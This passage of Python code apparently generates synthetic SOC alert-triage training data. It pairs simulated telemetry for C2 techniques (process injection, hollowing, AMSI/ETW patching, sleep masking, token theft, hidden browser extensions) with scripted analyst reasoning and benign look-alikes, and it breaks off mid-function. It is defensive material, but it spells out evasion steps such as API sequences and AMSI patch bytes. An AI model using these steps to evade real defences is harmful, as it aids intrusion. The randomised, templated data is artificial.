        + ("Arti (Rust Tor implementation) detected -- programmatic Tor usage, not browser. " if p['arti_library'] else ""),
        f"Host {p['src']}: C2 channel fully anonymized through Tor. "
        "True attacker IP is hidden. Tor provides persistent covert channel.",
        "Tor-based C2 channel confirmed -- connection to Tor consensus node + circuit establishment.",
        "MITRE T1090.003 (Multi-hop Proxy via Tor). Block Tor exit nodes at perimeter, isolate host.",
    )
    return prompt, cot, "true_positive"

def _tor_fp(i):
    # Slightly different -- security researcher / approved privacy tool
    p = {"user": "sre-research", "ticket": f"SEC-{random.randint(100,999)}",
         "machine": "RESEARCH-VM-01", "purpose": "threat intelligence research"}
    prompt = (f"Network Tap -- Tor Connection from Research VM.\n"
              f"  source_machine={p['machine']}  user={p['user']}\n"
              f"  ticket={p['ticket']}  purpose={p['purpose']}\n"
              f"  machine_type=isolated_research_vm  network_segment=research_vlan")
    cot = _cot(
        "Isolated research VM on research VLAN with approved ticket for threat intelligence.",
        f"machine={p['machine']} (isolated research VM). Ticket {p['ticket']}. Research VLAN.",
        "Authorized security research -- isolated VM, approved ticket, research network segment.",
        "Authorized security research Tor usage -- isolated VM, ticket.",
        "T1090.003 -- AUTHORIZED RESEARCH. Monitor for production network access.",
        action="monitor",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 8. C2RedirectorPattern
#    Evidence: Nginx/Apache forwarding X-Forwarded-For to internal teamserver,
#              404 for non-matching paths (whitelist enforcement), Let's Encrypt
#              cert on fresh domain, passes specific URI patterns to backend
#    Admin FP: Legitimate corporate reverse proxy (known infra, corp PKI)
# ═══════════════════════════════════════════════════════════════════════════════

def _redir_tp(i):
    domain_age = random.randint(1, 30)
    uri_whitelist = random.choice([
        ["/api/v2/check", "/updates/sync"],
        ["/Collector/2.0/settings/"],
        ["/mail/u/0/", "/s/ref=nb_sb"],
    ])
    p = {
        "redirector": _ip_ext(),
        "teamserver": _ip_int(),
        "domain_age_days": domain_age,
        "cert_issuer": "Let's Encrypt",
        "forward_header": "X-Forwarded-For",
        "non_matching_returns": "404 nginx",
        "uri_whitelist": uri_whitelist,
        "teamserver_port": random.choice([40056, 6060, 50050, 4444]),
        "backend_direct_exposure": False,
    }
    prompt = (f"Network Tap -- C2 Redirector Infrastructure.\n"
              f"  redirector_ip: {p['redirector']}\n"
              f"  teamserver_backend: {p['teamserver']}:{p['teamserver_port']}\n"
              f"  domain_age_days={p['domain_age_days']}\n"
              f"  cert_issuer={p['cert_issuer']}\n"
              f"  uri_whitelist={p['uri_whitelist']}\n"
              f"  non_matching_requests='{p['non_matching_returns']}'\n"
              f"  forwards_X-Forwarded-For_to_teamserver=YES\n"
              f"  teamserver_direct_exposure={p['backend_direct_exposure']}")
    cot = _cot(
        "Corporate reverse proxies are registered in the CMDB, use corporate PKI certificates, "
        "have stable domain histories, and forward to known internal services. "
        f"A {p['domain_age_days']}-day-old domain with a Let's Encrypt cert and strict URI "
        "whitelisting returning 404 for all non-matching paths is attacker infrastructure.",
        f"domain_age={p['domain_age_days']}d (freshly registered for this operation). "
        f"cert=Let's Encrypt (free, no identity validation). "
        f"uri_whitelist={p['uri_whitelist']} (only known C2 paths pass through). "
        f"non_matching='{p['non_matching_returns']}' (nginx 404 for all other paths -- strict whitelist). "
        f"backend={p['teamserver']}:{p['teamserver_port']} (non-standard teamserver port). "
        "X-Forwarded-For forwarded to hide backend. Standard C2 redirector deployment pattern.",
        f"Redirector at {p['redirector']} is proxying beacon traffic to teamserver {p['teamserver']}. "
        "Blocking the redirector IP will not stop the campaign -- teamserver is separate. "
        "Hunt backend IP via DNS/infrastructure correlation.",
        "C2 redirector infrastructure confirmed -- fresh domain + whitelist + backend teamserver.",
        "MITRE T1090.002 (Domain Fronting/Redirector). "
        "Block redirector IP, hunt teamserver backend, pivot on infrastructure.",
    )
    return prompt, cot, "true_positive"

def _redir_fp(i):
    p = {"proxy": "api-gw.corp.internal", "backend": "app-tier-01.corp.internal",
         "cert": "corp-pki-ca", "cmdb": "YES"}
    prompt = (f"Network Tap -- Corporate API Gateway.\n"
              f"  proxy={p['proxy']}  backend={p['backend']}\n"
              f"  cert_issuer={p['cert']}  cmdb_registered={p['cmdb']}\n"
              f"  domain_age=years  internal_destination=YES")
    cot = _cot(
        "Corporate API gateway -- internal destination, corp PKI, CMDB registered, years-old domain.",
        f"proxy={p['proxy']} (corp internal). cert={p['cert']} (PKI). CMDB registered. Internal backend.",
        "Authorized corporate API gateway -- internal, PKI, CMDB.",
        "Authorized corporate reverse proxy. No action.",
        "T1090 -- AUTHORIZED GATEWAY. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 9. RemoteProcessInjectionRWX
#    Evidence: VirtualAllocEx(PAGE_EXECUTE_READWRITE) → WriteProcessMemory →
#              NtCreateThreadEx in remote process, injection target is trusted
#              process (notepad, werfault, svchost), cross-process memory writes
#    Covers: Havoc Demon, agent-loader, Tempest, any shellcode-injecting C2
#    Admin FP: EDR agent reading LSASS (different pattern -- signed, SYSTEM)
# ═══════════════════════════════════════════════════════════════════════════════

def _rpirwx_tp(i):
    targets = ["notepad.exe","werfault.exe","RuntimeBroker.exe","svchost.exe","dllhost.exe"]
    methods = ["NtCreateThreadEx","NtQueueApcThread","SetWindowsHookEx","NtSetContextThread"]
    p = {
        "src_proc": random.choice(["powershell.exe","cmd.exe","unknown.exe","explorer.exe"]),
        "target_proc": random.choice(targets),
        "api_sequence": ["VirtualAllocEx(PAGE_EXECUTE_READWRITE)",
                         "WriteProcessMemory",
                         random.choice(methods)],
        "alloc_size_kb": random.randint(4, 512),
        "protect_flags": "PAGE_EXECUTE_READWRITE (RWX)",
        "injection_into_system_proc": random.choice([True, False]),
        "shellcode_entropy": round(random.uniform(3.8, 5.5), 3),
        "indirect_syscalls": i % 2 == 0,
    }
    prompt = (f"Windows Host -- Remote Process Injection (Shellcode).\n"
              f"Host: {_host()}\n"
              f"  SourceProcess: {p['src_proc']}\n"
              f"  TargetProcess: {p['target_proc']}\n"
              f"  API_sequence: {' → '.join(p['api_sequence'])}\n"
              f"  allocation_size_kb={p['alloc_size_kb']}\n"
              f"  memory_protection={p['protect_flags']}\n"
              f"  shellcode_entropy_in_alloc={p['shellcode_entropy']:.3f}\n"
              + (f"  indirect_syscalls_detected=YES (no ntdll imports for NT functions)\n" if p['indirect_syscalls'] else ""))
    cot = _cot(
        "EDR agents and system tools occasionally read remote process memory but never "
        "allocate RWX regions and create remote threads. The RWX+WriteProcessMemory+thread-create "
        "sequence has no legitimate administrative use case.",
        f"API sequence: {' → '.join(p['api_sequence'])} -- definitional shellcode injection pattern. "
        f"PAGE_EXECUTE_READWRITE allocation: memory is writable AND executable immediately "
        f"({p['alloc_size_kb']}KB). shellcode_entropy={p['shellcode_entropy']:.3f} (encrypted/encoded payload). "
        + (f"Indirect syscalls: NT functions called without ntdll import entries (EDR hook bypass). " if p['indirect_syscalls'] else "")
        + f"Target={p['target_proc']} (trusted process used for cover -- C2 traffic appears from this process).",
        f"C2 agent has injected shellcode into {p['target_proc']}. "
        "All subsequent C2 activity, network connections, and OS calls will appear to "
        f"originate from {p['target_proc']}. Standard process-based blocking is now bypassed.",
        "Remote shellcode injection into trusted process confirmed.",
        "MITRE T1055.001 (Process Injection: Dynamic-link Library Injection) / T1055 (Process Injection). "
        "Kill target process, isolate host, memory forensics.",
    )
    return prompt, cot, "true_positive"

def _rpirwx_fp(i):
    p = {"src": "CrowdStrike-CSAgent.exe", "target": "lsass.exe",
         "access": "PROCESS_VM_READ (no write, no exec)", "signed": True,
         "cert": "CrowdStrike Inc."}
    prompt = (f"Windows Host -- EDR Agent Memory Read.\n"
              f"  SourceProcess: {p['src']}\n"
              f"  TargetProcess: {p['target']}\n"
              f"  access_type={p['access']}\n"
              f"  binary_signed={p['signed']}  vendor_cert={p['cert']}\n"
              f"  no_VirtualAllocEx=YES  no_WriteProcessMemory=YES")
    cot = _cot(
        "CrowdStrike EDR reading LSASS for credential monitoring -- signed, PROCESS_VM_READ only, no RWX.",
        f"access=PROCESS_VM_READ only (no write, no exec allocation). Signed by {p['cert']}.",
        "Authorized EDR telemetry -- read-only, signed vendor.",
        "Authorized EDR LSASS monitoring. No action.",
        "T1055 -- AUTHORIZED EDR AGENT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 10. ProcessHollowing
#     Evidence: CreateProcess(CREATE_SUSPENDED) + NtWriteVirtualMemory +
#               NtUnmapViewOfSection + ResumeThread -- image replacement
#     Covers: Tempest (RunPE), agent-loader, general C2 delivery
#     Admin FP: No legitimate admin use case
# ═══════════════════════════════════════════════════════════════════════════════

def _ph_tp(i):
    victims = ["svchost.exe","dllhost.exe","RuntimeBroker.exe","notepad.exe","msiexec.exe"]
    p = {
        "host": _host(), "actor": random.choice(["wscript.exe","powershell.exe","explorer.exe"]),
        "victim": random.choice(victims),
        "api_sequence": ["CreateProcess(CREATE_SUSPENDED)",
                         "NtUnmapViewOfSection (unmapping original image)",
                         "VirtualAllocEx (new image region)",
                         "NtWriteVirtualMemory (injecting replacement image)",
                         "SetThreadContext (redirecting entry point)",
                         "ResumeThread (resuming hollowed process)"],
        "original_image_replaced": True,
        "final_pe_hash_differs": True,
        "pid_spoofed": i % 2 == 0,
    }
    prompt = (f"Windows Host -- Process Hollowing.\n"
              f"Host: {p['host']}\n"
              f"  ActorProcess: {p['actor']}\n"
              f"  VictimProcess: {p['victim']} (spawned SUSPENDED)\n"
              f"  API_sequence:\n    " + "\n    ".join(p['api_sequence']) + "\n"
              f"  original_image_replaced_in_memory: YES\n"
              f"  on_disk_hash_vs_memory_hash: DIFFER\n"
              + (f"  parent_pid_spoofed=YES\n" if p['pid_spoofed'] else ""))
    cot = _cot(
        "No application legitimately needs to spawn a process in a SUSPENDED state, unmap "
        "its original image from memory, write a new executable, redirect the entry point, "
        "and resume it. This six-step sequence is the definitional process hollowing pattern.",
        f"API sequence confirms RunPE/process hollowing: CREATE_SUSPENDED → unmap → alloc → write → SetThreadContext → Resume. "
        f"on_disk_hash ≠ memory_hash: the {p['victim']} executable in memory is NOT the system binary. "
        + (f"Parent PID spoofed -- attacker hiding process tree. " if p['pid_spoofed'] else "")
        + f"Victim={p['victim']} chosen for legitimacy (trusted Windows binary).",
        f"Host {p['host']}: {p['victim']} process in memory is running the attacker's payload. "
        "Process name, PID, and tree appear legitimate. Only memory hash comparison reveals the swap.",
        "Process hollowing confirmed -- image replaced in suspended process.",
        "MITRE T1055.012 (Process Injection: Process Hollowing). "
        "Kill victim process, memory dump before kill, isolate host.",
    )
    return prompt, cot, "true_positive"

def _ph_fp(i):
    # Near-FP: JVM class loading (but different -- no NtUnmapViewOfSection)
    p = {"proc": "java.exe", "pattern": "CreateProcess + VirtualAlloc (no unmap)", "jvm": True}
    prompt = (f"Windows Host -- JVM Class Loading.\n"
              f"  Process: {p['proc']}\n"
              f"  pattern={p['pattern']}\n"
              f"  NtUnmapViewOfSection=NO  original_image_intact=YES\n"
              f"  on_disk_hash_matches_memory=YES")
    cot = _cot(
        "JVM allocates memory for JIT-compiled code -- no image unmapping, original java.exe intact.",
        "NtUnmapViewOfSection=NO (original image not replaced). Hash matches. JVM JIT pattern.",
        "Authorized JVM JIT compilation -- no hollowing, original image intact.",
        "Authorized JVM class loading -- no process hollowing.",
        "T1055.012 -- JVM JIT, NOT HOLLOWING. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 11. IndirectSyscallStub
#     Evidence: NT functions invoked without ntdll.dll import table entries,
#               raw syscall instructions in non-ntdll memory, missing standard
#               API call chains (no CreateThread but process spawns threads)
#     Covers: Havoc (SysNtCreateThreadEx), Koneko, agent-loader
#     Admin FP: Performance-oriented legitimate app (rare, documented)
# ═══════════════════════════════════════════════════════════════════════════════

def _iss_tp(i):
    hooked_nt = random.sample(["NtCreateThreadEx","NtWriteVirtualMemory","NtOpenProcessToken",
                                "NtAllocateVirtualMemory","NtCreateSection","NtMapViewOfSection"], k=random.randint(3,6))
    p = {
        "host": _host(), "process": random.choice(["svchost.exe","dllhost.exe","notepad.exe"]),
        "nt_funcs_bypassed": hooked_nt,
        "syscall_numbers_hardcoded": True,
        "ntdll_import_entries": 0,
        "syscall_stubs_in_rwx": True,
        "return_to_ntdll": False,
    }
    prompt = (f"Windows Host (EDR Telemetry) -- Indirect Syscall Evasion.\n"
              f"Host: {p['host']}  Process: {p['process']}\n"
              f"  nt_functions_invoked_via_syscall_stub: {', '.join(p['nt_funcs_bypassed'])}\n"
              f"  ntdll_import_entries_for_these_funcs={p['ntdll_import_entries']}\n"
              f"  syscall_numbers_hardcoded_in_binary=YES\n"
              f"  syscall_stubs_in_rwx_region=YES\n"
              f"  return_address_points_to_ntdll=NO (spoofed return chain)")
    cot = _cot(
        "Some high-performance applications avoid ntdll for speed (e.g., game anti-cheat, "
        "certain security products). However, these are signed, well-documented, and call a "
        "bounded set of functions for specific purposes -- not NtCreateThreadEx + NtWriteVirtualMemory "
        "in combination with no ntdll imports.",
        f"NT functions invoked: {', '.join(p['nt_funcs_bypassed'][:3])} -- these are the "
        "core injection APIs. ntdll_imports=0 for all of them: attacker bypassed ntdll "
        "to evade user-mode EDR hooks that intercept ntdll exports. "
        "Syscall stubs in RWX region: custom assembly with hardcoded syscall numbers "
        "(Windows-version-specific). "
        "No return-to-ntdll: spoofed return address prevents EDR stack tracing.",
        f"Process {p['process']} on {p['host']} is executing kernel operations without going "
        "through ntdll -- standard EDR hooks see no activity. "
        "This is a deliberate anti-EDR technique used in modern C2 frameworks.",
        "Indirect syscall evasion confirmed -- NT functions bypassing ntdll hooks.",
        "MITRE T1562.001 (Impair Defenses: Disable or Modify Tools). "
        "Deploy kernel-level telemetry, isolate host, memory forensics.",
    )
    return prompt, cot, "true_positive"

def _iss_fp(i):
    p = {"proc": "EasyAntiCheat.sys", "funcs": ["NtQuerySystemInformation"],
         "signed": True, "purpose": "game anti-cheat kernel driver"}
    prompt = (f"Windows Host -- Anti-Cheat Syscall Bypass.\n"
              f"  Process: {p['proc']}  type=kernel_driver\n"
              f"  nt_funcs={p['funcs'][0]}  signed={p['signed']}\n"
              f"  purpose={p['purpose']}  EV_code_signed=YES")
    cot = _cot(
        "EasyAntiCheat kernel driver -- signed, single well-known NT function, EV code signed.",
        f"Signed EV cert. Single function (NtQuerySystemInformation). Kernel driver context.",
        "Authorized game anti-cheat kernel driver -- signed, bounded function use.",
        "Authorized anti-cheat kernel driver. No action.",
        "T1562 -- AUTHORIZED KERNEL DRIVER. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 12. SleepMaskingPattern
#     Evidence: No Sleep()/WaitForSingleObject calls in beaconing process,
#               instead NtCreateEvent + NtWaitForSingleObject,
#               periodic VirtualProtect RW→RX flips (Ekko),
#               heap encryption during sleep intervals
#     Covers: Havoc Ekko/FOLIAGE/Ziliean, Koneko, rekkoex (Tempest)
#     Admin FP: No legitimate use case -- this is pure evasion
# ═══════════════════════════════════════════════════════════════════════════════

def _smp_tp(i):
    technique = random.choice(["Ekko (heap encrypt during sleep)",
                                "Ziliean (timer-based, no Sleep())",
                                "FOLIAGE (stack duplication)",
                                "rekkoex (C5pider technique)"])
    p = {
        "host": _host(), "process": random.choice(["notepad.exe","svchost.exe","werfault.exe"]),
        "technique": technique,
        "sleep_api_calls": 0,
        "ntevent_wait_sequence": True,
        "rwx_protection_flips": i % 2 == 0,
        "heap_entropy_during_sleep": round(random.uniform(0.0, 0.5), 3),
        "heap_entropy_active": round(random.uniform(3.5, 5.5), 3),
        "timer_callback_count": random.randint(20, 500),
    }
    prompt = (f"Windows Host (EDR) -- Sleep Masking / Memory Obfuscation.\n"
              f"Host: {p['host']}  Process: {p['process']}\n"
              f"  sleep_masking_technique: {p['technique']}\n"
              f"  Sleep()_API_calls=0 (no standard sleep observable)\n"
              f"  NtCreateEvent_+_NtWaitForSingleObject_sequence=YES\n"
              f"  timer_callback_count={p['timer_callback_count']}\n"
              + (f"  VirtualProtect_RW→RX_flip_count={random.randint(20,200)} (Ekko heap encryption)\n" if p['rwx_protection_flips'] else "")
              + f"  heap_entropy_while_sleeping={p['heap_entropy_during_sleep']:.3f}\n"
              + f"  heap_entropy_while_active={p['heap_entropy_active']:.3f}")
    cot = _cot(
        "No production application eliminates all Sleep() calls and replaces them with "
        "NtCreateEvent/NtWaitForSingleObject with periodic VirtualProtect flips. "
        "This pattern exists solely to defeat memory scanners that look for RWX regions during sleep.",
        f"Sleep()=0 calls: agent uses {p['technique']} to avoid standard sleep detection. "
        f"NtCreateEvent+NtWaitForSingleObject: custom sleep mechanism without standard API. "
        + (f"VirtualProtect RW↔RX flips: heap encrypted to RW during sleep (no executable code visible to scanner), "
           "decrypted back to RX before next beacon. " if p['rwx_protection_flips'] else "")
        + f"heap_entropy drops from {p['heap_entropy_active']:.3f} to {p['heap_entropy_during_sleep']:.3f} during sleep "
        "(encrypted = near-uniform, low entropy).",
        f"Host {p['host']}: C2 agent in {p['process']} is actively evading memory scanners. "
        "The agent becomes invisible during sleep intervals -- periodic memory scans will miss it.",
        "Sleep masking confirmed -- anti-EDR beacon obfuscation technique.",
        "MITRE T1055 + T1562.001 (Memory manipulation + Impair Defenses). "
        "Deploy continuous memory monitoring, isolate host.",
    )
    return prompt, cot, "true_positive"

def _smp_fp(i):
    p = {"proc": "chrome.exe", "waits": "WaitForSingleObjectEx", "reason": "GPU sync primitive"}
    prompt = (f"Windows Host -- Application Timer-based Wait.\n"
              f"  Process: {p['proc']}\n"
              f"  wait_api={p['waits']}  reason={p['reason']}\n"
              f"  no_VirtualProtect_flips=YES  heap_entropy_stable=YES")
    cot = _cot(
        "Chrome GPU sync using WaitForSingleObjectEx -- no heap encryption flips, stable entropy.",
        "No VirtualProtect flips. Heap entropy stable. Standard wait primitive. Chrome GPU path.",
        "Authorized browser GPU synchronization primitive.",
        "Authorized Chrome GPU sync. No action.",
        "T1055 -- AUTHORIZED CHROME GPU SYNC. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 13. AMSIETWMemPatch
#     Evidence: WriteProcessMemory to amsi.dll or ntdll.dll base address,
#               memory protection change on system DLL pages,
#               VirtualProtect on amsi.dll or EtwEventWrite function
#     Covers: Havoc AMSIETW_PATCH_HWBP/MEM, any AMSI bypass
#     Admin FP: No legitimate use case -- direct DLL patching
# ═══════════════════════════════════════════════════════════════════════════════

def _amsi_tp(i):
    target = random.choice(["amsi.dll!AmsiScanBuffer", "ntdll.dll!EtwEventWrite",
                             "ntdll.dll!NtTraceEvent", "amsi.dll!AmsiOpenSession"])
    method = random.choice([
        "WriteProcessMemory (RET/NOP patch)",
        "Hardware breakpoint (DR0-DR3) on function entry",
        "VEH handler intercepts HWBP exception",
    ])
    p = {
        "host": _host(), "actor": random.choice(["powershell.exe","csc.exe","wscript.exe"]),
        "target_func": target,
        "patch_method": method,
        "patch_bytes": random.choice(["0xC3 (RET)", "0x90 0x90 (NOP NOP)", "0x31 0xC0 (XOR EAX,EAX)"]),
        "vprotect_change": "RX → RW → RX (patch window)",
        "hwbp": "hardware_breakpoint" in method,
    }
    prompt = (f"Windows Host -- AMSI/ETW Memory Patch.\n"
              f"Host: {p['host']}  Actor: {p['actor']}\n"
              f"  target_function: {p['target_func']}\n"
              f"  patch_method: {p['patch_method']}\n"
              f"  patch_bytes: {p['patch_bytes']}\n"
              f"  VirtualProtect_sequence: {p['vprotect_change']}\n"
              + (f"  hardware_breakpoint_on_DR0=YES (NtSetInformationThread)\n" if p['hwbp'] else ""))
    cot = _cot(
        "Security vendors occasionally patch their own DLLs for update purposes, but these "
        "operations occur via signed installer processes with specific file paths, not "
        f"from {p['actor']} patching system DLL functions at runtime.",
        f"Target={p['target_func']} -- AMSI scan function or ETW event write. "
        f"Patching with {p['patch_bytes']}: "
        + ("RET immediately returns benign result. " if "RET" in p['patch_bytes'] else
           "NOP disables the function body. " if "NOP" in p['patch_bytes'] else "XOR clears return value. ")
        + f"VirtualProtect RX→RW→RX: changed protection to write patch, then back. "
        + (f"Hardware breakpoint on function entry: intercepts call before function body executes. " if p['hwbp'] else "")
        + f"Actor={p['actor']} (script host patching a security DLL = definitional bypass technique).",
        f"Host {p['host']}: AMSI is disabled for this process -- all subsequent PowerShell scripts, "
        "CLR assemblies, and VBA macros run without malware scanning. ETW telemetry is suppressed.",
        "AMSI/ETW memory patch confirmed -- security controls disabled in-process.",
        "MITRE T1562.001 (Disable or Modify Tools: AMSI bypass). "
        "Kill process, restore DLL integrity, escalate to incident response.",
    )
    return prompt, cot, "true_positive"

def _amsi_fp(i):
    p = {"proc": "WindowsDefenderAMSI.dll updater",
         "signed": True, "via": "Windows Update", "target": "amsi.dll (file replace, not memory patch)"}
    prompt = (f"Windows Host -- AMSI DLL File Update.\n"
              f"  process=TrustedInstaller.exe  operation=file_replace\n"
              f"  target={p['target']}\n"
              f"  signed={p['signed']}  via={p['via']}\n"
              f"  no_VirtualProtect_sequence=YES  no_runtime_patch=YES")
    cot = _cot(
        "Windows Update replacing amsi.dll on disk via TrustedInstaller -- file replacement, not runtime patch.",
        "TrustedInstaller (trusted). File replacement (not memory patch). Windows Update. Signed.",
        "Authorized Windows Update AMSI DLL replacement -- file-level, not memory patch.",
        "Authorized Windows Update. No action.",
        "T1562.001 -- AUTHORIZED WINDOWS UPDATE. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 14. ReflectiveDLLLoad
#     Evidence: PE header in allocated memory region with no disk backing file,
#               no LoadLibrary call, custom PE loader executing,
#               image base relocation in memory without disk file
#     Covers: agent-loader (reflective DLL), Havoc, many C2 loaders
#     Admin FP: JVM/CLR (.NET assembly loading -- different pattern)
# ═══════════════════════════════════════════════════════════════════════════════

def _rdll_tp(i):
    p = {
        "host": _host(), "loader_proc": random.choice(["powershell.exe","wscript.exe","mshta.exe"]),
        "alloc_size_kb": random.randint(64, 2048),
        "pe_magic_in_mem": "MZ/PE header at allocation base",
        "no_disk_backing": True,
        "loadlibrary_called": False,
        "base_reloc_applied": True,
        "iat_resolved": True,
        "entropy_of_region": round(random.uniform(3.5, 5.5), 3),
    }
    prompt = (f"Windows Host -- Reflective DLL In-Memory Load.\n"
              f"Host: {p['host']}  Loader: {p['loader_proc']}\n"
              f"  VirtualAlloc_region_size_kb={p['alloc_size_kb']}\n"
              f"  pe_magic_at_base={p['pe_magic_in_mem']}\n"
              f"  disk_backing_file=NONE\n"
              f"  LoadLibrary_API_called={p['loadlibrary_called']}\n"
              f"  base_relocations_applied=YES\n"
              f"  IAT_resolved_at_runtime=YES\n"
              f"  region_entropy={p['entropy_of_region']:.3f}")
    cot = _cot(
        "The JVM and CLR load assemblies/classes without disk files, but they use "
        "JNI/CLR-documented APIs with legitimate parent contexts. A script host allocating "
        "a raw PE image in memory and manually fixing base relocations and IAT is not JVM or CLR.",
        f"MZ/PE header at allocation base -- raw PE image in memory. "
        f"disk_backing=NONE -- PE was never on disk (or was deleted). "
        f"LoadLibrary=False -- PE loader is custom-implemented inside the shellcode. "
        f"base_relocations + IAT_resolved -- full manual PE loading (reflective loading technique). "
        f"region_entropy={p['entropy_of_region']:.3f} (encrypted payload decoded at runtime). "
        f"loader={p['loader_proc']} (script host performing in-memory PE execution).",
        f"Host {p['host']}: C2 agent DLL loaded entirely in memory without touching disk. "
        "Standard AV/file scanning cannot detect it. Only memory forensics or behavioral "
        "detection catches this.",
        "Reflective DLL loading confirmed -- in-memory PE without disk backing.",
        "MITRE T1620 (Reflective Code Loading). Memory dump, isolate host, forensics.",
    )
    return prompt, cot, "true_positive"

def _rdll_fp(i):
    p = {"proc": "dotnet.exe", "type": ".NET assembly (CLR loading)",
         "api": "System.Reflection.Assembly.Load()", "disk": "System.Core.dll on disk"}
    prompt = (f"Windows Host -- .NET Assembly Load.\n"
              f"  Process: {p['proc']}\n"
              f"  type={p['type']}  api={p['api']}\n"
              f"  disk_backing_file={p['disk']}\n"
              f"  CLR_managed=YES  no_manual_IAT_resolution=YES")
    cot = _cot(
        ".NET Assembly.Load() -- CLR-managed, disk-backed, no manual PE loading.",
        f"CLR-managed loading. Disk backing exists. No manual IAT resolution. Standard .NET pattern.",
        "Authorized .NET assembly loading via CLR.",
        "Authorized .NET assembly loading. No action.",
        "T1620 -- AUTHORIZED .NET CLR LOADING. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 15. TokenDuplicationC2
#     Evidence: C2 agent using NtOpenProcessToken + NtDuplicateToken to
#               impersonate other users for lateral movement / privilege,
#               ImpersonateLoggedOnUser called in beacon context
#     Covers: agent-loader token vault, Havoc token manipulation
#     Admin FP: RunAs / PsExec with service account (change ticket)
# ═══════════════════════════════════════════════════════════════════════════════

def _tdc2_tp(i):
    targets = ["SYSTEM", "Domain Admin", "Service Account", "Local Admin"]
    p = {
        "host": _host(), "c2_proc": random.choice(["notepad.exe","werfault.exe","svchost.exe"]),
        "target_acct": random.choice(targets),
        "api_sequence": ["NtOpenProcessToken", "NtDuplicateToken(TOKEN_ALL_ACCESS)",
                         "ImpersonateLoggedOnUser", "CreateProcessWithTokenW"],
        "token_vault_size": random.randint(2, 10),
        "lateral_target": _ip_int() if i % 2 == 0 else None,
        "event_4674": True,
    }
    prompt = (f"Windows Host -- Token Duplication for C2 Lateral Movement.\n"
              f"Host: {p['host']}  C2 Process: {p['c2_proc']}\n"
              f"  token_target_account: {p['target_acct']}\n"
              f"  API_sequence: {' → '.join(p['api_sequence'])}\n"
              f"  token_vault_entries={p['token_vault_size']} (multiple stolen tokens cached)\n"
              f"  EventID_4674=YES (attempt to operate on privileged object)\n"
              + (f"  lateral_movement_target={p['lateral_target']}\n" if p['lateral_target'] else ""))
    cot = _cot(
        "PsExec and RunAs legitimately duplicate tokens, but they are standalone signed tools "
        "with change tickets. A C2 agent (injected into notepad/svchost) maintaining a "
        f"vault of {p['token_vault_size']} stolen tokens and impersonating {p['target_acct']} "
        "has no authorized administrative use.",
        f"API: NtOpenProcessToken → NtDuplicateToken(TOKEN_ALL_ACCESS) → ImpersonateLoggedOnUser "
        "→ CreateProcessWithTokenW -- token theft and impersonation chain. "
        f"token_vault={p['token_vault_size']} entries: agent is caching tokens from multiple "
        "users/services for opportunistic lateral movement. "
        f"Target={p['target_acct']} (highest available privilege). EventID 4674 confirms privileged operation. "
        + (f"Lateral target {p['lateral_target']} indicates planned pivot." if p['lateral_target'] else ""),
        f"Host {p['host']}: C2 agent has stolen tokens for {p['token_vault_size']} accounts. "
        "Will use these to authenticate laterally, run commands as other users, "
        "and maintain access even after primary account is revoked.",
        "Token duplication for C2 lateral movement confirmed.",
        "MITRE T1134.001 (Token Impersonation) + T1021 (Lateral Movement). "
        "Isolate host, revoke all sessions for affected accounts.",
    )
    return prompt, cot, "true_positive"

def _tdc2_fp(i):
    p = {"tool": "PsExec.exe", "acct": "svc-deploy", "ticket": f"CHG-{random.randint(10000,99999)}"}
    prompt = (f"Windows Host -- Elevated Process Execution.\n"
              f"  Tool: {p['tool']}  account={p['acct']}\n"
              f"  change_ticket={p['ticket']}  signed=YES  single_token=YES")
    cot = _cot(
        "PsExec with service account for single authorized task -- signed, ticketed, single token.",
        f"PsExec (signed). single_token (not a vault). Ticket {p['ticket']}.",
        "Authorized deployment via PsExec -- signed tool, service account, change ticket.",
        "Authorized PsExec deployment. No action.",
        "T1134 -- AUTHORIZED PSEXEC. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 16. ChromeExtensionC2
#     Evidence: hidden extension directory in %APPDATA%, extension polling
#               external server at 30s intervals, startup folder entry for loader,
#               browser launched with --load-extension pointing to hidden path,
#               MetaMask override (wallet JavaScript replacement)
#     Covers: chrome-c2-extension
#     Admin FP: Legitimate enterprise Chrome extension (managed, signed)
# ═══════════════════════════════════════════════════════════════════════════════

def _ccx_tp(i):
    ext_id = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=32))
    p = {
        "host": _host(), "user": _user(),
        "ext_path": rf"C:\Users\{_user()}\AppData\Roaming\.hidden_extension\extension",
        "ext_id": ext_id,
        "c2_server": _ip_ext(),
        "poll_interval_s": 30,
        "cv": round(random.uniform(0.01, 0.05), 4),
        "startup_entry": rf"C:\Users\{_user()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\loader.lnk",
        "metamask_override": i % 2 == 0,
        "launched_with_flag": "--load-extension",
    }
    prompt = (f"Windows Host -- Browser Extension C2.\n"
              f"Host: {p['host']}  User: {p['user']}\n"
              f"  hidden_extension_path: {p['ext_path']}\n"
              f"  extension_id: {p['ext_id']}\n"
              f"  browser_launched_with: {p['launched_with_flag']}={p['ext_path']}\n"
              f"  c2_server_polls: {p['c2_server']}  interval_s={p['poll_interval_s']}  cv={p['cv']:.4f}\n"
              f"  startup_folder_entry: {p['startup_entry']}\n"
              + (f"  metamask_extension_overridden=YES (wallet JS replaced)\n" if p['metamask_override'] else ""))
    cot = _cot(
        "Enterprise Chrome extensions are deployed via managed Google Admin Console, "
        "appear in chrome://extensions with known extension IDs, and come from the Chrome Web Store. "
        f"A hidden extension in %APPDATA%\\.hidden_extension\\, loaded via command-line flag, "
        "is not a managed enterprise deployment.",
        f"ext_path={p['ext_path']} (hidden AppData path -- not Chrome Web Store). "
        f"--load-extension flag forces unpacked extension load (bypasses Web Store verification). "
